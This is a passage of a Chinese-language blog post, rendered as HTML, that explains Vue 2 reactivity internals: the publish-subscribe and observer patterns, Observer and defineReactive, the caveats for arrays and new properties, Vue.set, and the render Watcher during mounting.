class="keyword">this</span>.newTodoText &#125;)</span><br><span class="line">    <span class="keyword">this</span>.newTodoText = <span class="string">''</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ComponentB.vue</span></span><br><span class="line"><span class="comment">// 订阅者</span></span><br><span class="line">created: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 订阅事件</span></span><br><span class="line">    eventHub.$on(<span class="string">'add-todo'</span>, <span class="keyword">this</span>.addTodo)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="模拟实现vue的自定义事件"><a href="#模拟实现vue的自定义事件" class="headerlink" title="模拟实现vue的自定义事件"></a>模拟实现vue的自定义事件</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 类内部存储一个对象，包含事件名和对应的触发函数</span></span><br><span class="line">   <span class="comment">// &#123; click: [fn1, fn2], change: fn &#125;</span></span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">EventEmitter</span> </span>&#123;</span><br><span class="line">     <span class="keyword">constructor</span> () &#123;</span><br><span class="line">       <span class="keyword">this</span>.subs = <span class="built_in">Object</span>.create(<span class="literal">null</span>)</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="comment">// 注册事件</span></span><br><span class="line">     $on (eventType, handler) &#123;</span><br><span class="line">       <span class="keyword">this</span>.subs[eventType] = <span class="keyword">this</span>.subs[eventType] || []</span><br><span class="line">       <span class="keyword">this</span>.subs[eventType].push(handler)</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="comment">// 触发事件</span></span><br><span class="line">     $emit (eventType) &#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">this</span>.subs[eventType]) &#123;</span><br><span class="line">         <span class="keyword">this</span>.subs[eventType].foreach(<span class="function"><span class="params">handler</span> =&gt;</span> &#123;</span><br><span class="line">           handler()</span><br><span class="line">         &#125;)</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 测试</span></span><br><span class="line">   <span class="keyword">let</span> em = <span class="keyword">new</span> EventEmitter() <span class="comment">// 信号中心</span></span><br><span class="line">   em.$on(<span class="string">'click'</span>, () =&gt; &#123;</span><br><span class="line">     <span class="built_in">console</span>.log(<span class="string">'click1'</span>)</span><br><span class="line">   &#125;)</span><br><span class="line">   em.$on(<span class="string">'click'</span>, () =&gt; &#123;</span><br><span class="line">     <span class="built_in">console</span>.log(<span class="string">'click2'</span>)</span><br><span class="line">   &#125;)</span><br><span class="line">   em.$emit(<span class="string">'click'</span>)</span><br></pre></td></tr></table></figure><h3 id="观察者模式"><a href="#观察者模式" class="headerlink" title="观察者模式"></a>观察者模式</h3><ul><li>观察者  – watcher<ul><li>update()：当事件发生时，具体要做的事情</li></ul></li><li>发布者 – Dep<ul><li>subs数组：存储所有观察者</li><li>addSub()：添加观察者</li><li>notify()：当事件发生，调用所有观察者的update方法</li></ul></li><li>没有事件中心</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 发布者-目标</span></span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">Dep</span> </span>&#123;</span><br><span class="line">     <span class="keyword">constructor</span> () &#123;</span><br><span class="line">       <span class="comment">// 记录所有的订阅者</span></span><br><span class="line">       <span class="keyword">this</span>.subs = []</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="comment">// 添加订阅者</span></span><br><span class="line">     addSub (sub) &#123;</span><br><span class="line">       <span class="keyword">if</span> (sub &amp;&amp; sub.update) &#123;</span><br><span class="line">         <span class="keyword">this</span>.subs.push(sub)</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="comment">// 发布通知</span></span><br><span class="line">     notify () &#123;</span><br><span class="line">       <span class="keyword">this</span>.subs.forEach(<span class="function"><span class="params">sub</span> =&gt;</span> &#123;</span><br><span class="line">         sub.update()</span><br><span class="line">       &#125;)</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">// 订阅者-观察者</span></span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">Watcher</span> </span>&#123;</span><br><span class="line">     update () &#123;</span><br><span class="line">       <span class="built_in">console</span>.log(<span class="string">'update'</span>)</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 测试</span></span><br><span class="line">   <span class="keyword">let</span> dep = <span class="keyword">new</span> Dep()</span><br><span class="line">   <span class="keyword">let</span> watcher = <span class="keyword">new</span> Watcher()</span><br><span class="line"></span><br><span class="line">   dep.addSub(watcher)</span><br><span class="line"></span><br><span class="line">   dep.notify()</span><br></pre></td></tr></table></figure><h3 id="Vue实例初始化过程"><a href="#Vue实例初始化过程" class="headerlink" title="Vue实例初始化过程"></a>Vue实例初始化过程</h3><p>在 Vue 实例初始化的时候会调用<code>_init</code>方法，<code>_init</code>方法中有很多初始化的过程，比如</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//初始化生命周期</span></span><br><span class="line">initLifecycle(vm)</span><br><span class="line"><span class="comment">//初始化事件</span></span><br><span class="line">initEvents(vm)</span><br><span class="line"><span class="comment">//初始化render</span></span><br><span class="line">initRender(vm)</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">initState(vm)</span><br></pre></td></tr></table></figure><p>这里的重点就是<code>initState</code>方法，<code>initState</code>中也初始化了很多，如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//初始化props</span></span><br><span class="line"><span class="keyword">if</span> (opts.props) initProps(vm, opts.props)</span><br><span class="line"><span class="comment">//初始化methods</span></span><br><span class="line"><span class="keyword">if</span> (opts.methods) initMethods(vm, opts.methods)</span><br><span class="line"><span class="comment">//初始化data！！！再次划重点！！！</span></span><br><span class="line"><span class="keyword">if</span> (opts.data) &#123;</span><br><span class="line">  initData(vm)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="comment">//即使没有data，也要调用observe观测_data对象</span></span><br><span class="line">  observe(vm._data = &#123;&#125;, <span class="literal">true</span> <span class="comment">/* asRootData */</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的重点就是<code>initData</code>方法，在其内部调用了<code>observe</code>方法，到这里才是真正响应式的开始</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//将vm中的属性转至vm._data中</span></span><br><span class="line">proxy(vm, <span class="string">`_data`</span>, key)</span><br><span class="line"><span class="comment">//调用observe观测data对象</span></span><br><span class="line">observe(data, <span class="literal">true</span> <span class="comment">/* asRootData */</span>)</span><br></pre></td></tr></table></figure><p>observe是一个工厂函数，用于为对象生成一个Observe实例。而真正将对象转化为响应式对象的是observe工厂函数返回的Observe实例。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="class"><span class="keyword">class</span> <span class="title">Observer</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span> (value: any) &#123;</span><br><span class="line">    <span class="comment">//对象本身</span></span><br><span class="line">    <span class="keyword">this</span>.value = value</span><br><span class="line">    <span class="comment">//依赖收集器</span></span><br><span class="line">    <span class="keyword">this</span>.dep = <span class="keyword">new</span> Dep()</span><br><span class="line">    <span class="keyword">this</span>.vmCount = <span class="number">0</span></span><br><span class="line">    <span class="comment">//为对象添加__ob__属性</span></span><br><span class="line">    def(value, <span class="string">'__ob__'</span>, <span class="keyword">this</span>)</span><br><span class="line">    <span class="comment">//若对象是array类型</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">Array</span>.isArray(value)) &#123;</span><br><span class="line">      ...</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">//若对象是object类型</span></span><br><span class="line">      ...</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>从代码分析，Observe构造函数做了三件事：</p><ul><li>为对象添加 <code>__ob__</code>属性， <code>__ob__</code>中包含value数据对象本身、dep依赖收集器、vmCount。数据经过这个步骤以后的变化如下：</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//原数据</span></span><br><span class="line">  <span class="keyword">const</span> data = &#123;</span><br><span class="line">        name: <span class="string">'summer'</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//变化后数据</span></span><br><span class="line">  <span class="keyword">const</span> data = &#123;</span><br><span class="line">        name: <span class="string">'summer'</span>,</span><br><span class="line">        __ob__: &#123;</span><br><span class="line">            value: data, <span class="comment">//data数据本身</span></span><br><span class="line">            dep: <span class="keyword">new</span> Dep(), <span class="comment">//dep依赖收集器</span></span><br><span class="line">            vmCount: <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><ul><li>若对象是array类型，则进行array类型操作</li><li>若对象是object类型，则进行object类型操作</li></ul><h4 id="1-数据是object类型"><a href="#1-数据是object类型" class="headerlink" title="1. 数据是object类型"></a>1. 数据是object类型</h4><p>当数据是object类型时，调用了一个walk方法，在walk方法中遍历数据的所有属性，并调用defineReactive方法。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">defineReactive</span> (<span class="params">...</span>) </span>&#123;</span><br><span class="line">  <span class="comment">//dep存储依赖的变量，每个属性字段都有一个属于自己的dep，用于收集属于该字段的依赖</span></span><br><span class="line">  <span class="keyword">const</span> dep = <span class="keyword">new</span> Dep()</span><br><span class="line"></span><br><span class="line">  <span class="comment">//为属性加入getter/setter方法</span></span><br><span class="line">  <span class="built_in">Object</span>.defineProperty(obj, key, &#123;</span><br><span class="line">    enumerable: <span class="literal">true</span>,</span><br><span class="line">    configurable: <span class="literal">true</span>,</span><br><span class="line">    get () &#123;</span><br><span class="line">      <span class="comment">// 收集依赖，target会在watcher类中定义</span></span><br><span class="line">      Dep.target &amp;&amp; dep.addSub(Dep.target)</span><br><span class="line">      <span class="keyword">return</span> val</span><br><span class="line">    &#125;,</span><br><span class="line">    set (newValue) &#123;</span><br><span class="line">      <span class="keyword">if</span> (newValue === val) &#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">      &#125;</span><br><span class="line">       val = newValue</span><br><span class="line">       that.walk(newValue)</span><br><span class="line">       <span class="comment">// 发送通知</span></span><br><span class="line">       dep.notify()</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>在getter中收集依赖，在setter中触发依赖。</strong></p><ul><li>当外界通过Watcher读取数据时，会触发getter从而将Watcher添加到依赖中。</li><li>在修改对象的值的时候，会触发对应的<code>setter</code>， <code>setter</code>通知之前<strong>依赖收集</strong>得到的 Dep 中的每一个 Watcher，告诉它们自己的值改变了，需要重新渲染视图。这时候这些 Watcher就会开始调用 <code>update</code> 来更新视图。</li></ul><h4 id="2-数据是array类型"><a href="#2-数据是array类型" class="headerlink" title="2. 数据是array类型"></a>2. 数据是array类型</h4><p>调用<code>arrayMethods</code>拦截修改数组方法：</p><ul><li>需要拦截的修改数组的方法有：push、pop、shift、unshift、splice、sort、reverse</li><li>当数组有新增元素时，使用observeArray对新增的元素进行观测</li></ul><p><strong>对于对象</strong></p><p>Vue 无法检测 property 的添加或移除。这是因为 Vue 通过<code>Object.defineProperty</code>来将对象的key转换成<code>getter/setter</code>的形式来追踪变化，但<code>getter/setter</code>只能追踪一个数据是否被修改，无法追踪新增属性和删除属性。由于 Vue 会在<strong>初始化实例</strong>时对 property 执行 getter/setter 转化，所以 property 必须在 <code>data</code> 对象上存在才能让 Vue 将它转换为响应式的。例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> vm = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  data:&#123;</span><br><span class="line">    a:<span class="number">1</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// `vm.a` 是响应式的</span></span><br><span class="line"></span><br><span class="line">vm.b = <span class="number">2</span></span><br><span class="line"><span class="comment">// `vm.b` 是非响应式的</span></span><br></pre></td></tr></table></figure><p>对于已经创建的实例，Vue 不允许动态添加根级别的响应式 property。但是，可以使用 <code>Vue.set(object, propertyName, value)</code> 方法向嵌套对象添加响应式 property。例如，对于：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Vue.set(vm.someObject, <span class="string">'b'</span>, <span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>您还可以使用 <code>vm.$set</code> 实例方法，这也是全局 <code>Vue.set</code> 方法的别名：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.$set(<span class="keyword">this</span>.someObject,<span class="string">'b'</span>,<span class="number">2</span>)</span><br></pre></td></tr></table></figure><ul><li>给data对象的某个属性设置为一个新的对象<code>this.o = { name: &#39;xxx&#39; }</code>，此对象是响应式的</li><li>给data对象的obj新增一个name属性时，<code>this.obj.name = &#39;xxx&#39;</code>，该属性不是响应式的</li></ul><p><strong>对于数组</strong></p><p><code>Object.defineProperty</code> 不能监听数组的一些方法，push/pop/splice等等改变原数组的方法不能触发set，需要进行数组方法的重写。（Vue3中使用proxy则不存在这些问题）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">因为 Vue2.x 的响应式是通过 Object.defineProperty() 实现的，这个 api 没办法监听数组长度的变化，也就没办法监听数组的新增，push/pop/splice等也就不能触发set</span><br></pre></td></tr></table></figure><p>此外 Vue 不能检测以下数组的变动：</p><ol><li>当你利用索引直接设置一个数组项时，例如：<code>vm.items[indexOfItem] = newValue</code></li><li>当你修改数组的长度时，例如：<code>vm.items.length = newLength</code></li></ol><p>举个例子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> vm = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  data: &#123;</span><br><span class="line">    items: [<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line">vm.items[<span class="number">1</span>] = <span class="string">'x'</span> <span class="comment">// 不是响应性的</span></span><br><span class="line">vm.items.length = <span class="number">2</span> <span class="comment">// 不是响应性的</span></span><br></pre></td></tr></table></figure><p><strong>为什么数组方法可以重写，但是不去监听数组属性(索引和length)呢？</strong></p><ul><li>性能问题：数组数据可能有很多</li></ul><p>为了解决这个问题，以下两种方式都可以实现和 <code>vm.items[indexOfItem] = newValue</code> 相同的效果，同时也将在响应式系统内触发状态更新：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Vue.set</span></span><br><span class="line">Vue.set(vm.items, indexOfItem, newValue)</span><br><span class="line"><span class="comment">// Array.prototype.splice</span></span><br><span class="line">vm.items.splice(indexOfItem, <span class="number">1</span>, newValue)</span><br></pre></td></tr></table></figure><p>你也可以使用 <a href="https://cn.vuejs.org/v2/api/#vm-set" target="_blank" rel="noopener"><code>vm.$set</code></a> 实例方法，该方法是全局方法 <code>Vue.set</code> 的一个别名：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vm.$set(vm.items, indexOfItem, newValue)</span><br></pre></td></tr></table></figure><p>为了解决不监听数组长度的问题，你可以使用 <code>splice</code>和重写数组方法：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vm.items.splice(newLength)</span><br></pre></td></tr></table></figure><ul><li>Vue.set 和 vm.$set内部是同一个方法，原理是手动触发 notify</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">// 获取 target 中的 observer 对象</span></span><br><span class="line">  <span class="keyword">const</span> ob = (target: any).__ob__</span><br><span class="line">  <span class="comment">// 如果 target 是 vue 实例或者$data 直接返回</span></span><br><span class="line">  <span class="keyword">if</span> (target._isVue || (ob &amp;&amp; ob.vmCount)) &#123;</span><br><span class="line">    <span class="keyword">return</span> val</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 如果 ob 不存在，target 不是响应式对象直接赋值</span></span><br><span class="line">  <span class="keyword">if</span> (!ob) &#123;</span><br><span class="line">    target[key] = val</span><br><span class="line">    <span class="keyword">return</span> val</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 把 key 设置成响应式属性</span></span><br><span class="line">  defineReactive(ob.value, key, val)</span><br><span class="line">  <span class="comment">// 发送通知</span></span><br><span class="line">  ob.dep.notify()</span><br><span class="line">  <span class="keyword">return</span> val</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="组件渲染过程"><a href="#组件渲染过程" class="headerlink" title="组件渲染过程"></a>组件渲染过程</h3><p><strong>那么究竟是如何触发依赖实现响应式的呢，从组件渲染阶段开始说起</strong></p><p>vue源码的 instance/init.js 中是初始化的入口，其中初始化中除了初始化的几个步骤以外，在最后有这样一段 代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (vm.$options.el) &#123;</span><br><span class="line">  vm.$mount(vm.$options.el)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>一共有两个<code>$mount</code>,第一个定义在<code>entry-runtime-with-compiler.js</code>文件中,<code>$mount()</code>的核心作用是帮我们把模板编译成<code>render</code>函数，但它首先会判断一下当前是否传入了<code>render</code>选项，如果没有传入的话，它会去获取我们的<code>template</code>选项，如果<code>template</code>选项也没有的话，他会把<code>el</code>中的内容作为我们的模板，然后把模板编译成<code>render</code>函数，它是通过<code>compile</code>函数，帮我们把模板编译成<code>render</code>函数的,当把<code>render</code>函数编译好之后，它会把<code>render</code>函数存在我们的<code>options.render</code>中。</li><li>接着会调用<code>src/platforms/web/runtime/index.js</code>文件中的<code>$mount</code>方法,在这个中首先会重新获取<code>el</code>，因为如果是运行时版本的话，是不会走<code>entry-runtime-with-compiler.js</code>这个入口中获取el，我们会在runtime/index.js的$mount()中重新获取el。</li><li>接下来调用<code>mountComponent()</code>,首先会判断<code>render</code>选项，如果没有<code>render</code>选项，但是我们传入了模板，会发送一个警告，,告诉我们如果是运行时版本不支持编译器。接下来会触发beforeMount这个生命周期中的钩子函数，也就是开始挂载之前。</li><li>然后定义了updateComponent()，在这个函数中，调用<code>vm._render</code>和<code>vm._update</code>，<code>vm._render</code>的作用是生成虚拟DOM，<code>vm._update</code>的作用是将虚拟<code>DOM</code>转换成真实<code>DOM</code>，并且挂载到页面上</li><li>创建<code>Watcher</code>对象，在创建<code>Watcher</code>时，传递了<code>updateComponent</code>这个函数，这个函数最终是在<code>Watcher</code>内部调用的。在<code>Watcher</code>内部会用<code>get</code>方法，当Watcher创建完成之后,会触发生命周期中的<code>mounted</code>钩子函数,在get方法中，会调用<code>updateComponent()</code></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> Watcher(vm, updateComponent, noop, &#123;</span><br><span class="line">    before () &#123;</span><br><span class="line">      <span class="keyword">if</span> (vm._isMounted &amp;&amp; !vm._isDestroyed) &#123;</span><br><span class="line">        callHook(vm, <span class="string">'beforeUpdate'</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, <span class="literal">true</span> <span class="comment">/* isRenderWatcher */</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// vm ：与Wather对应的Vue Component实例，这种对应关系通过Wather去管理</span></span><br><span class="line"><span class="comment">// updateComponent：可以理解成Vue Component的更新函数，调用实例render和update两个方法，render作用是将Vue对象渲染成虚拟DOM,update是通过虚拟DOM创建或者更新真实DOM</span></span><br></pre></td></tr></table></figure><p>Watche 实例分为渲染 watcher (render watcher),计算属性 watcher (computed watcher),侦听器 watcher（user watcher）三种：</p><ol><li>initState 时,对 computed 属性初始化时,触发 computed watcher 依赖收集</li><li>initState 时,对侦听属性初始化时,触发 user watcher 依赖收集</li><li>render()的过程,触发 render watcher 依赖收集</li><li>re-render 时,vm.render()再次执行,会移除所有 subs 中的 watcer 的订阅,重新赋值。</li></ol><p><strong>watcher类</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Watcher</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span> (</span><br><span class="line">    vm: Component, </span><br><span class="line">    expOrFn: string | Function,</span><br><span class="line">    cb: Function,</span><br><span class="line">    options?: ?Object,</span><br><span class="line">    isRenderWatcher?: boolean</span><br><span class="line">  ) &#123;</span><br><span class="line">    <span class="keyword">this</span>.vm = vm</span><br><span class="line">    <span class="keyword">if</span> (isRenderWatcher) &#123;</span><br><span class="line">      <span class="comment">// 将渲染函数的观察者存入_watcher</span></span><br><span class="line">      vm._watcher = <span class="keyword">this</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 将所有观察者push到_watchers列表</span></span><br><span class="line">    vm._watchers.push(<span class="keyword">this</span>)</span><br><span class="line">  &#125;</span><br><span class="line">    </span><br><span class="line">  get () &#123; <span class="comment">// 触发取值操作，进而触发属性的getter</span></span><br><span class="line">    pushTarget(<span class="keyword">this</span>) <span class="comment">// Dep 中提到的：给 Dep.target 赋值</span></span><br><span class="line">    <span class="keyword">let</span> value</span><br><span class="line">    <span class="keyword">const</span> vm = <span class="keyword">this</span>.vm</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="comment">// 核心，运行观察者表达式，进行取值，触发getter，从而在闭包中添加watcher</span></span><br><span class="line">      value = <span class="keyword">this</span>.getter.call(vm, vm)</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>.user) &#123;</span><br><span class="line">        handleError(e, vm, <span class="string">`getter for watcher "<span class="subst">$&#123;<span class="keyword">this</span>.expression&#125;</span>"`</span>)</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> e</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>.deep) &#123; <span class="comment">// 如果要深度监测，再对 value 执行操作</span></span><br><span class="line">        traverse(value)</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 清理依赖收集</span></span><br><span class="line">      popTarget()</span><br><span class="line">      <span class="keyword">this</span>.cleanupDeps()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 当依赖变化时，触发更新</span></span><br><span class="line">  update () &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="响应式的整体流程"><a href="#响应式的整体流程" class="headerlink" title="响应式的整体流程"></a>响应式的整体流程</h3><p>总结一下响应式的整体流程：<br>假设有模版：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;test&quot;&gt;</span><br><span class="line">  &#123;&#123;str&#125;&#125;</span><br><span 